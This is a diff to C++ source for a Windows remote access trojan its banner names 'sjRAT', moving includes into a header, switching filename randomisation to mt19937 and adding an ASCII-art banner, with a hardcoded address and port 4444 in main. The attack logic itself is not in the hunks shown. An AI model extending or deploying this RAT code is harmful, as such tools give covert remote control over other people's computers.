@@ -1,30 +1,18 @@
-#include <WinSock2.h>
-#include <WS2tcpip.h>
-#include <Windows.h>
-#include <iostream>
-#include <fstream>
-#include <stdexcept>
-#include <stdio.h>
-#include <string.h>
-#include <tchar.h>
-#include <chrono>
-#include <mmsystem.h>
-#include <tlhelp32.h>
-#include <ctime>
-#pragma comment(lib, "winmm.lib")
-#pragma comment(lib, "Ws2_32.lib")
-
-#define FILE_BUFF_SIZE  100'000'000
+#include "includes.h"
 
 std::string GenerateRandomFilename()
 {
     const std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
     const int length = 8;  // Длина случайного имени файла
 
+    std::random_device rd; // gets random seed for generation
+    std::mt19937 generator(rd());
+    std::uniform_int_distribution<int> distribution(0, characters.size() - 1); // generate random index
+
     std::string randomFilename;
     for (int i = 0; i < length; ++i)
     {
-        int index = rand() % characters.size();
+        int index = distribution(generator);
         randomFilename += characters[index];
     }
 
@@ -164,6 +152,22 @@ void help_menu()
     printf("=====================================\n");
 }
 
+void banner()
+{
+    printf("=========================https://github.com/Quality15/sjRAT========================\n");
+    printf("   d888888o.             8 8888 8 888888888o.            .8.    8888888 8888888888 \n");
+    printf(" .`8888:' `88.           8 8888 8 8888    `88.          .888.         8 8888       \n");
+    printf(" 8.`8888.   Y8           8 8888 8 8888     `88         :88888.        8 8888       \n");
+    printf(" `8.`8888.               8 8888 8 8888     ,88        . `88888.       8 8888       \n");
+    printf("  `8.`8888.              8 8888 8 8888.   ,88'       .8. `88888.      8 8888       \n");
+    printf("   `8.`8888.             8 8888 8 888888888P'       .8`8. `88888.     8 8888       \n");
+    printf("    `8.`8888. 88.        8 8888 8 8888`8b          .8' `8. `88888.    8 8888       \n");
+    printf("8b   `8.`8888.`88.       8 888' 8 8888 `8b.       .8'   `8. `88888.   8 8888       \n");
+    printf("`8b.  ;8.`8888  `88o.    8 88'  8 8888   `8b.    .888888888. `88888.  8 8888       \n");
+    printf(" `Y8888P ,88P'    `Y888888 '    8 8888     `88. .8'       `8. `88888. 8 8888       \n");
+    printf("================================v%s=============================================\n", VERSION.c_str());
+}
+
 void MeasurePingTime(SOCKET client)
 {
     // Отправляем текущее время клиенту
@@ -188,6 +192,9 @@ int main(int argc, char* argv[])
 {
     char ip_addr[] = "192.168.31.135";
     int port = 4444;
+
+    // Show banner
+    banner();
 
     // Startup WinSock
     STARTUPINFO si;
